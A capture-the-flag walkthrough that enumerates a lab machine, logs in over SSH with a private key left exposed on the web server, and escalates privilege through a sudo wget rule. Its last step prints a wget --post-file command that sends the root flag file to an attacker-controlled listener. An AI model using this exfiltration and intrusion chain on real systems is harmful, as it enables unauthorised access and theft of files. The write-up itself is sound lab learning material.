# Enumeration

A quick nmap scan reveals that ports 22 and 80 are open. We follow up with a detailed scan.

![bc580b5f2b9dd855f491f47cf5ce2a34.png](./_resources/bc580b5f2b9dd855f491f47cf5ce2a34.png)

![0febb921978f368d9cefc6dcfab987ad.png](./_resources/0febb921978f368d9cefc6dcfab987ad.png)

The web server displays the Apache2 Ubuntu Default Page, but if we look at the source code we find a potentially useful comment.

![8949208ba9e34a2f666c7501117ceadb.png](./_resources/8949208ba9e34a2f666c7501117ceadb.png)

Let's use gobuster to find any possible directories of interest. Run `gobuster dir -u http://10.10.21.149 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
`. The only directory we find is `/sitemap`, which leads us to a template for Unapp.

![cdf3413a49c3cb93602dcf32dd28edb9.png](./_resources/cdf3413a49c3cb93602dcf32dd28edb9.png)

We can also scan the web server with `nikto -h 10.10.21.149`, although nothing of note comes up. At this point we're a bit stuck, so let's run gobuster again using the directory we found. After running gobuster through a few different wordlists, we eventually find something interesting using the `common.txt` wordlist that comes with dirbuster. Run `gobuster dir -u http://10.10.21.149/sitemap -w /usr/share/dirb/wordlists/common.txt
`. 

![499bc967bcc63eaa6f32342ceb42fc0e.png](./_resources/499bc967bcc63eaa6f32342ceb42fc0e.png)

Note that we have access to the `/.ssh` subdirectory. Navigating to it gives us an RSA key.

![b206b119c5479f084be6319a1418555a.png](./_resources/b206b119c5479f084be6319a1418555a.png)

<br>

# Exploitation

The fact that a private RSA key was easily accessible is a major vulnerability. Since we know that SSH is running on port 22, we can try to exploit this vulnerability in the most natural way. We found a potential username earlier in the source code of the default Apache2 web page, so we can try SSHing into the machine with this. Use `chmod 600 id_rsa` to give the RSA key the correct permissions, then SSH in using `ssh -i id_rsa <username>@<target IP>`.

![9dd68ece514c07bae5417f9cca35fcc9.png](./_resources/9dd68ece514c07bae5417f9cca35fcc9.png)

Success! From here, we gain initial access and we easily find the user flag.

![1ea7ea9754c1d240bf4eea6624ecea95.png](./_resources/1ea7ea9754c1d240bf4eea6624ecea95.png)

<br>

# Post-exploitation

Let's begin looking for privilege escalation methods. Using `sudo -l`, we see that Jessie is able to run `wget` with root privileges.

![32d77136d8f026c6db258ab4d7429633.png](./_resources/32d77136d8f026c6db258ab4d7429633.png)

We can use this to our advantage by setting up a netcat listener on our attacking machine and using wget (with root privileges) to send any POST request we want. Set up a netcat listener on the attacking machine. Making an educated guess at the location (and file name) of the root flag, we run `sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<attacker IP>:<port>
`.  Our netcat listener receives the POST request, and the root flag is displayed.

![3b71f118c5e0654783bd6712a062cf8a.png](./_resources/3b71f118c5e0654783bd6712a062cf8a.png)

![b3896484e5528ef1898704ca2ac1f5e9.png](./_resources/b3896484e5528ef1898704ca2ac1f5e9.png)